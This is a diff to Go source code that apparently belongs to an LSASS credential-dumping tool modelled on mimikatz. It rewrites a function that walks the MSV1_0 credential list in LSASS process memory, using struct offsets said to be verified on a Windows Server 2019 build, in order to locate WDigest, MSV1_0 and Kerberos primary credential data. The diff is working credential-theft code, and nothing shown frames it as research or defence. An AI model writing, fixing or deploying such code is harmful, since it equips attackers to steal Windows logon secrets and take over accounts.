@@ -22,23 +22,23 @@ import (
 	"fmt"
 )
 
-// KIWI_MSV1_0_CREDENTIAL_LIST_X64 layout — doubly-linked circular list with
-// an embedded KIWI_MSV1_0_CREDENTIALS struct (default x64 packing):
+// KIWI_MSV1_0_CREDENTIALS x64 layout — singly-linked list of per-AuthPackage
+// credential entries. CredentialsPtr from the logon session points directly
+// to the first entry (no LIST_ENTRY sentinel wrapper):
 //
-//	+0x00  Flink                    (PKIWI_MSV1_0_CREDENTIAL_LIST, 8 bytes)
-//	+0x08  Blink                    (PKIWI_MSV1_0_CREDENTIAL_LIST, 8 bytes)
-//	+0x10  Credentials.next         (PKIWI_MSV1_0_CREDENTIALS, 8 bytes)
-//	+0x18  Credentials.AuthPkgId    (DWORD, 4 bytes + 4 bytes alignment pad)
-//	+0x20  Credentials.PrimaryCreds (PVOID, 8 bytes)
-//	total                           (0x28 = 40 bytes)
+//	+0x00  next         (PKIWI_MSV1_0_CREDENTIALS, 8 bytes — NULL terminates)
+//	+0x08  AuthPkgId    (DWORD, 4 bytes + 4 bytes alignment pad)
+//	+0x10  PrimaryCreds (PKIWI_MSV1_0_PRIMARY_CREDENTIALS, 8 bytes)
+//	total               (0x18 = 24 bytes)
 //
-// The CredentialsPtr from the logon session points to the LIST HEAD (sentinel).
-// Real entries begin at head.Flink and wrap back to head.
+// Verified on Server 2019 build 17763.3650: AuthPkgId=3 (WDigest) at +0x08,
+// valid PrimaryCredentials pointer at +0x10. The singly-linked `next` at +0x00
+// chains additional auth packages (MSV1_0, Kerberos, etc.).
 const (
-	credentialListEntryReadSize   = 0x28
-	credentialListEntryFlinkOff   = 0
-	credentialListEntryAuthPkgOff = 0x18
-	credentialListEntryDataPtrOff = 0x20
+	credentialEntryReadSize   = 0x18
+	credentialEntryNextOff    = 0
+	credentialEntryAuthPkgOff = 0x08
+	credentialEntryDataPtrOff = 0x10
 )
 
 // KIWI_MSV1_0_PRIMARY_CREDENTIALS layout — singly-linked chain of
@@ -93,89 +93,54 @@ type primaryCredentialEnc struct {
 	ParseErrors      []string
 }
 
-// credentialListDiag captures diagnostic data from the credential list walk
-// to help debug struct layout issues across Windows versions.
-type credentialListDiag struct {
-	HeadAddress string `json:"head_address"`
-	HeadHex     string `json:"head_hex"`
-	Flink       string `json:"flink"`
-	Blink       string `json:"blink"`
-	FlinkIsHead bool   `json:"flink_is_head"`
-}
-
-// walkCredentialList walks a circular doubly-linked credential list starting
-// from the sentinel head. The Credentials pointer from the logon session
-// points to a LIST_ENTRY sentinel; real entries start at head.Flink and wrap
-// back to head (per mimikatz kuhl_m_sekurlsa_msv1_0.c pattern).
+// walkCredentialList walks a singly-linked KIWI_MSV1_0_CREDENTIALS chain
+// starting directly at `head`. The CredentialsPtr from the logon session
+// points to the first entry (no sentinel). The `next` field at +0x00
+// chains additional auth packages; NULL terminates.
 //
-// Termination conditions:
-//   - Flink == head (wrapped back to sentinel — clean termination)
-//   - Flink == 0 (NULL-terminated variant — also clean)
-//   - maxEntries iterations (defensive cap)
-//   - read failure (returns partial list + error)
+// Termination:
+//   - next == 0 (NULL-terminated — clean)
+//   - cycle detected (defensive)
+//   - maxEntries cap (defensive)
+//   - read failure (returns partial + error)
 //
-// A zero head returns (nil, nil, nil).
-func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credentialListEntry, *credentialListDiag, error) {
+// A zero head returns (nil, nil).
+func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credentialListEntry, error) {
 	if r == nil {
-		return nil, nil, fmt.Errorf("nil lsassReader")
+		return nil, fmt.Errorf("nil lsassReader")
 	}
 	if head == 0 {
-		return nil, nil, nil
+		return nil, nil
 	}
 	if maxEntries <= 0 {
 		maxEntries = credentialListMaxEntries
 	}
 
-	headBuf, err := r.Read(head, 0x30)
-	if err != nil {
-		return nil, nil, fmt.Errorf("read credential list head at 0x%X: %w", head, err)
-	}
-
-	diag := &credentialListDiag{
-		HeadAddress: fmt.Sprintf("0x%X", head),
-	}
-	if len(headBuf) >= 0x30 {
-		diag.HeadHex = fmt.Sprintf("%x", headBuf)
-	}
-
-	if len(headBuf) < 16 {
-		return nil, diag, fmt.Errorf("short read at credential list head (0x%X): got %d, need 16", head, len(headBuf))
-	}
-	flink := uintptr(binary.LittleEndian.Uint64(headBuf[0:8]))
-	blink := uintptr(binary.LittleEndian.Uint64(headBuf[8:16]))
-	diag.Flink = fmt.Sprintf("0x%X", flink)
-	diag.Blink = fmt.Sprintf("0x%X", blink)
-	diag.FlinkIsHead = (flink == head)
-
-	if flink == 0 || flink == head {
-		return nil, diag, nil
-	}
-
 	entries := make([]credentialListEntry, 0, 4)
 	visited := make(map[uintptr]bool, 4)
-	cursor := flink
+	cursor := head
 	for i := 0; i < maxEntries; i++ {
-		if cursor == 0 || cursor == head {
-			return entries, diag, nil
+		if cursor == 0 {
+			return entries, nil
 		}
 		if visited[cursor] {
-			return entries, diag, nil
+			return entries, nil
 		}
 		visited[cursor] = true
 
-		buf, err := r.Read(cursor, uint32(credentialListEntryReadSize))
+		buf, err := r.Read(cursor, uint32(credentialEntryReadSize))
 		if err != nil {
-			return entries, diag, fmt.Errorf("read credential entry %d at 0x%X: %w", i, cursor, err)
+			return entries, fmt.Errorf("read credential entry %d at 0x%X: %w", i, cursor, err)
 		}
-		if len(buf) < credentialListEntryReadSize {
-			return entries, diag, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need %d", i, cursor, len(buf), credentialListEntryReadSize)
+		if len(buf) < credentialEntryReadSize {
+			return entries, fmt.Errorf("short read at credential entry %d (0x%X): got %d, need %d", i, cursor, len(buf), credentialEntryReadSize)
 		}
 
 		entry := credentialListEntry{
 			Address:                   cursor,
-			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryFlinkOff : credentialListEntryFlinkOff+8])),
-			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialListEntryAuthPkgOff : credentialListEntryAuthPkgOff+4]),
-			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialListEntryDataPtrOff : credentialListEntryDataPtrOff+8])),
+			Flink:                     uintptr(binary.LittleEndian.Uint64(buf[credentialEntryNextOff : credentialEntryNextOff+8])),
+			AuthPackageId:             binary.LittleEndian.Uint32(buf[credentialEntryAuthPkgOff : credentialEntryAuthPkgOff+4]),
+			PrimaryCredentialsDataPtr: uintptr(binary.LittleEndian.Uint64(buf[credentialEntryDataPtrOff : credentialEntryDataPtrOff+8])),
 		}
 		entry.AuthPackageName = authPackageName(entry.AuthPackageId)
 		entry.RawHex = fmt.Sprintf("%x", buf)
@@ -192,7 +157,7 @@ func walkCredentialList(r lsassReader, head uintptr, maxEntries int) ([]credenti
 		entries = append(entries, entry)
 		cursor = entry.Flink
 	}
-	return entries, diag, fmt.Errorf("credential list walk hit safety cap of %d entries (last cursor=0x%X)", maxEntries, cursor)
+	return entries, fmt.Errorf("credential list walk hit safety cap of %d entries (last cursor=0x%X)", maxEntries, cursor)
 }
 
 // readPrimaryCredentialEnc fetches a KIWI_MSV1_0_PRIMARY_CREDENTIALS envelope
